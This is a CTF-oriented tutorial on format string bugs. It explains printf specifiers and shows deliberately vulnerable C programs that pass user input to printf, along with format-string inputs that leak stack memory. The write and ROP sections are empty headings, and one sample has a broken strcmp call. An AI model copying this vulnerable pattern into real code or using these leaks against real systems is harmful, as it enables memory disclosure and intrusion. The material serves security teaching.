---
title: A Definitive Guide to Format String Bug
date: '2024-02-29'
tags: ['ctf-techs', 'fsb', 'format-string', 'printf']
draft: false
summary: A detailed guide on how printf's can be used for arbitrary read and arbitrary write.
---

## Introduction

In this guide, I'll be explaining intricate details of Format String Bugs, how they occur, how they work and how they can be exploited to read values , write values to an arbitrary location and get a shell. This blog post will go in-depth to make sure that we fully understand each concept as we go through them.

## Table of Contents

1. **[What is a Format String](#what-is-a-format-string-and-printf)**
    - **[Specifier](#specifiers)**
        - **[Length sub-specifier](#length-sub-specifier)**
        - **[Position sub-specifier](#position-sub-specifier)**
2. **[What is Printf](#what-is-printf)**
    - **[Usage](#usage)**
3. **[Format String Bug](#format-string-bug)**
    - [Occurance of an FSB](#occurance-of-an-fsb)
4. **[Arbitrary Read](#arbitrary-read)**
    - [From the stack](#from-the-stack)
    - [From an address](#from-an-address)
    - [Bypassing PIE/ASLR/NX](#bypassing-pieaslrnx)
5. **[Arbitrary Write](#arbitrary-write)**
    - [To an address](#to-an-address)
    - [Overwriting GOT Entries](#overwriting-entries-on-the-global-offset-table)
    - [Writing a ROP Chain](#writing-a-rop-chain-using-fsb)
6. **[Debugging FSB](#debugging-fsb)**
7. **[Pwntools and other tools](#pwntools-and-other-tools)**

---

## What is a Format String?

In order to understand `Format String Bug`, we must first fully understand what `Format String` is.

> A format string is a string that contains special placeholders or format specifiers, which are used to define the layout and formatting of variables when creating formatted output. These format specifiers are placeholders for values that will be substituted into the string during runtime.

A format specifier must follow the following syntax (Reference: [cplusplus.com](https://cplusplus.com/reference/cstdio/printf/)):

```c
%[flags][width][.precision][length]specifer
```

### Specifiers

For each of the data type in C/C++, there exists a specifier that needs to passed for the value that is to be displayed. There exist the following the specifiers:

| specifier | data-type |
| --- | --- |
| d or i | Signed Decimal Integer |
| u | Unsigned Decimal Integer |
| o | Unsigned Octal |
| x or X | Unsigned Hexadecimal Integer |
| f or F | Decimal Floating Point |
| e or E | Scientific notation (mantissa/exponent) |
| g or G | Use the shortest representation: %e or %f |
| a or A | Hexadecimal floating point |
| c | Character |
| s | String of characters (`NULL` terminated) |
| p | Pointer address
| n | **Important:** This doesn't really print anything, but argument to this must be a pointer to a signed int. This will write the number of characters written so for the pointed location. |
| % | A % followed by another % character will write a single % to the stream |

The format specifier can also contain sub-specifiers: flags, width, .precision and length modifiers (in that order), which are optional and follow these specifications. For our exploitation purposes, the only thing that is worth noting is the `length` modifier. However, it is recommended that we understand the inner workings, for that, I highly recommend that you go and read [this](https://cplusplus.com/reference/cstdio/printf/).

#### Length sub-specifier

The length sub-specifier modifies the length of the data type.

| length sub-specifier | d,i | u,o,x,X | f,F,e,E,g,G,a,A | c | s | p | n |
| --- | --- | --- | --- | --- | --- | --- | --- |
| (none) | int | unsigned int | double | int | char* | void* | int* |
| hh | signed char (one-byte) | unsigned char | - | - | - | - | signed char* |
| h | short int (2-bytes) | unsigned short int | - | - | - | - | short int* |
| l | long int (8-bytes) | unsigned long int | - | wint_t | wchar_t* | - | long int* |
| ll | long long int (8-bytes) | unsigned long long int | - | - | - | - | long long int* |

> NOTE: There are other sub-specifiers, but we'll focus on only these.

#### Position sub-specifier

There's also one sub-specifier (per-se) that allows an exact position offset value (from `RSP`) that can be passed to a specifier specified. The usage of that is as follows:

```c
%{POSITION}${SPECIFIER}

/* Example: */
%10$p
// This will print the 10th value as a pointer address from the RSP.
```

## What is Printf

According to [`cplusplus.com`](https://cplusplus.com/reference/cstdio/printf/):

> Writes the C string pointed by format to the standard output (stdout). If format includes format specifiers (subsequences beginning with %), the additional arguments following format are formatted and inserted in the resulting string replacing their respective specifiers.

In simpler terms, `printf` is a function that takes in a [`format specifier`](#specifiers), parses it and displays it to `stdout`. Printf can take `N` number of arguments. These type of functions that can take an arbitrary number of arguments are often known as `variadic` functions. These functions have `...` in their arguments list refering to `N` number of arguments input. The prototype of `printf` is as follows:

```c
int printf ( const char * format, ... );
```

> Fun-Fact: When printf doesn't have any format specifier, compilers such as `gcc` and `clang` often compile `printf` to `puts` for performance enhancment.

The following functions from the format string family are often most vulnerable to FSBs:

1. `printf()`
2. `fprintf()`
3. `sprintf()`
4. `vprintf()`
5. `snprintf()`
6. `vsnprintf()`
7. `vfprintf()`

### Usage

Let's consider the following program to understand the basic usage of printf

```c:printf-usage.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char* name = "Ashfaq Nadeem\0";
    int age = 22;
    printf("My name is %s and I'm %d years old!\n", name, age);
}
```

We can compile this program using:

```bash
gcc -o printf-usage printf-usage.c -w
```

Once we run the `./printf-usage` binary, we get an output like this:

```txt
My name is Ashfaq Nadeem and I'm 22 years old!
```

Now, what happened under the hood was, the `%s`, looked for it's value from the first specified argument, i.e. `name`, and `%d` looked for it's argument in the second argument.

Using the position sub-specifier, we'll make the third specifier read value from the second argument passed to `printf`. It would look something like this:

```c:print-usage-2.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char* name = "Ashfaq Nadeem\0";
    int age = 22;
    printf("My name is %s and I'm %d years old. But people don't really believe that I'm %2$d years old.\n", name, age);
}
```

> NOTE: we might get a warning, but we can ignore this. ;)

The output for this becomes:

```txt:stdout
My name is Ashfaq Nadeem and I'm 22 years old. But people don't really believe that I'm 22 years old.
```

What happened here? Well, the second argument passed to `printf` was `age`. In the third specifier, i.e. `%2$d`, what we simply did was tell printf to use the second argument passed to it, and put it here.

## Format String Bug

A Format String Bug (FSB) is a bug that occurs when an unsanitized input is directly passed to a printf and the input contains a `format string`.

### Occurance of an FSB

Let's consider the following code:

```c:fsb-test.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    int age = 22;
    printf("My age: %d\nMy ID: %d\nMy uuid: %d\nMy data: %d\n", age);
}
```

Now, what's the exact problem in this code? Well, We've only passed one argument to the printf, i.e. `age`, but there are `3` more specifiers that do not have an associated variable, what happens in this case? The values that are currently stored on the stack, will start printing. The output will be something like this:

```txt:stdout
My age: 22
My ID: 1478696264
My uuid: -1761119872
My data: 0
```

Why is that? That is because, in `printf`, the format specifiers can read value off of the stack. If no argument is provided, the next value stored will be popped into the specifier that is present. Therefore, in our case, we only passed `age`, and nothing else. `Printf`, automatically got the second, third and forth value from the stack and populated the format string itself.

The question here becomes, ***This is a bug in code, how is this even exploitable?***. The answer is pretty simple, what if you control what is directly passed into the printf?

To better understand this, consider this code:

```c:fsb-test-2.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[0x100];
    printf("Enter your name: ");
    scanf("%250s", buffer);
    printf(buffer);
}
```

Now, in this code, we can see that, our input is directly passed into `printf`, i.e. `printf(buffer)`. The problem here is:

1. If we pass a format string as input; let's say `%d`, then the function call will become: `printf("%d")`, which will simply derefence the first value as an integer and give us the output. Let's pass input: `%d.%d.%d.%d` as input to this program:

```txt:stdout
Enter your name: %d.%d.%d.%d
10.0.0.10
```

### Exploitation of an FSB

Now, we've seen how we can read a value from the stack, but there are ways we can also write values on to the stack, and other places which can give us code-execution. FSB can be exploited to let us do the following:

1. Read arbitrary data from the stack
2. Read arbitrary data from an address
3. Read ELF/library addresses from the stack to bypass PIE/ASLR
4. Write arbitrary data to the stack
5. Overwrite an entry on the GOT to override execution
6. Write a ROP chain and execute it

## Arbitrary Read

We have already taken a look at what arbitrary read looks like in [Occurance of an FSB](#occurance-of-an-fsb) section. However, in this section, we'll dive really deep into this.

Now, using an FSB, we can do to two kinds of reads:

- From the stack
- From an address

### From the stack

Now, we've understood the theory behind how printf works and how we can easily read values from the stack using a simple FSB. Let's explore this a bit further. To better understand, let's consider the following program:

```c:fsb-stack-read.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[0x100];
    char admin_pwd[0x20] = { "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD" };

    printf("What is your name? ");
    scanf("%255s", buffer);

    printf("Welcome ");
    printf(buffer);

    printf("Do you know what the admin password is? ");
    scanf("%255s", buffer);

    if(strcmp(admin_pwd == buffer) == 0) {
        printf("You have successfully passed this test...");
        return 0;
    }

    printf("Well, %s; you failed!", buffer);
    return 1;
}
```

Now, in this program, the first input takes values as input and passes it directly into the `printf`, giving us an `fsb`. The next input, will ask for an `admin password` and then compares it with `admin_pwd`. In our case, the `admin_pwd` is hardcoded, however, in somecases, we might have to leak values from the stack. So, let's try and leak the `admin_pwd`.

> NOTE: We have PIE enabled on this program so we can't directly give it the address of `admin_pwd` to leak value.

Let's firstly start out by simply passing `%s` specifier to the `name` input:

```txt:stdout
What is your name? %s
[1]    494914 segmentation fault (core dumped)  ./main
```

Wait, our program crashed? This is because, the `%s` specifier actually dereferences the value that is present, this is often used for `char*`, which are actually pointers and therefore, the program crashed because the program tried to read value from a non-existent/unreachable address. Let's check the address stored at this position by using the `%p` specifier:

```txt:stdout
What is your name? %p
Welcome 0x20656d6f636c6557Do you know what the admin password is? 
```

Well, the program did not crash this time, and we got a weird looking hex, `0x20656d6f636c6557`. Well, now we know why our program crashed when we entered `%s`. Now, what if we want to read the next values from the stack? Well, [position sub-specifiers](#position-sub-specifier) are our best friend. Let's try and enter `%2$p`, to print the second value from the stack. Also, this time; I'll add a seperator in my input to easily be able to identify the data. The input that I'll pass will be: `|%2$p|`

```txt:stdout
What is your name? |%2$p|
Welcome |(nil)|Do you know what the admin password is? 
```

Well, this time, we can see that we got `(nil)`, which indicates that `0x00000000` exists in this location. Let's try and read multiple values from the stack. The input that I'll pass will be: `|%3$p|%4$p|%5$p|%6$p|`

```txt:stdout
What is your name? |%3$p|%4$p|%5$p|%6$p|
Welcome |(nil)|0xa|0x8|0x4141414141414141|Do you know what the admin password is? 
```

Now, we can see that, on `%6$p`, we got `0x4141414141414141`, which corresponds to `AAAAAAAA`. Looking at the admin_pwd, we can see that, from offset `6`, `admin_pwd` exists. We can leak, `%7`, `%8` and `%9`, to get the remaining data of `admin_pwd` from the stack:

```txt:stdout
What is your name? |%6$p|%7$p|%8$p|%9$p|
Welcome |0x4141414141414141|0x4242424242424242|0x4343434343434343|0x4444444444444444|Do you know what the admin password is? 
```

Now, we have the value from the stack.

> NOTE: This value is in little endian, we cannot see it because of the repeating values. So, parse it accordingly.

Similar to this technique, we can also leak strings from the stack by just changing the specifier to `%s`. However, for the strings, make sure to pass only one specifier at a time to ensure that we get a string as the program will just crash if the address on that specifier is invalid.

### From an address

In the previous technique, we simply leaked values from the stack to read the contents of a variable. Now, what if we want to leak value from a specified address. What then? Well, FSBs are powerful enough to do just that. Let's consider the following program:

```c:fsb-address-read.c
#include <stdio.h>
#include <stdlib.h>

char flag[100];

void read_flag() {
    FILE *file;
    file = fopen("flag.txt", "r");
    fgets(flag, 100, file);
    fclose(file);
}

int main() {
    char buffer[100];
    read_flag();
    printf("Flag is stored at: %p\n", flag);
    printf("Who are you? ");
    scanf("%100s", buffer);
    printf(buffer);
}
```

> NOTE: For this technique, we'll be using `pwntools` to write an exploit.

We'll compile this program with PIE disabled:

```bash
gcc -o fsb-address-read fsb-address-read.c -no-pie -w
```

Now, after running the program, we're greeted with the following output:

```txt:stdout
Flag is stored at: 0x404080
Who are you? 
```

Now, we can see that, we're given the address of `flag`, and we need to leak the value from that address. There are two ways of doing this.

1. Writing address before our format string
2. Writing address after our format string

Now, the first one is most often used, however, the problem with that approach is, if `printf` encounters a NULL-byte, the format string won't execute. Meaning, let's say, flag was at address `0x404000`, then; in that scenario, if we actually passed the address before the format string, the `printf` would stop on getting that `0x00`. Therefore, we often write after our format string, but for the sake of this guide, i'll explain both.

Before writing, we need to do one important thing:

#### Identifying the Format String start offset

Now, in order to make sure that we write at the exact offset on the stack where our format string is; we need to find it. Finding it is pretty easy. We normally send in `A`'s as input, and then send multiple specifier. Whatever specifier returns `0x41`, we can easily know that that'll be the start of our format string.

So, let's send the following input to our `fsb-address-read` program:

```bash
AAAAAAAA|%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

```txt:stdout
Flag is stored at: 0x404080
Who are you? AAAAAAAA|%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAAAAAA|0xa.(nil).(nil).0xa.0x7c.0x4141414141414141.0x252e70252e70257c.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x7f0070252e70.0x7ffd031ada36
```

Now, we can see that, at position 6, we got `0x4141414141414141`, meaning that we found the start of our format string to be `6`. We can confirm this by sending: `AAAAAAAA|%6$p` as input:

```txt:stdout
Flag is stored at: 0x404080
Who are you? AAAAAAAA|%6$p
AAAAAAAA|0x4141414141414141
```



### Bypassing PIE/ASLR/NX

## Arbitrary Write

### To an address

### Overwriting Entries on the Global Offset Table

### Writing a ROP Chain using FSB

## Debugging FSB

## Pwntools and other tools
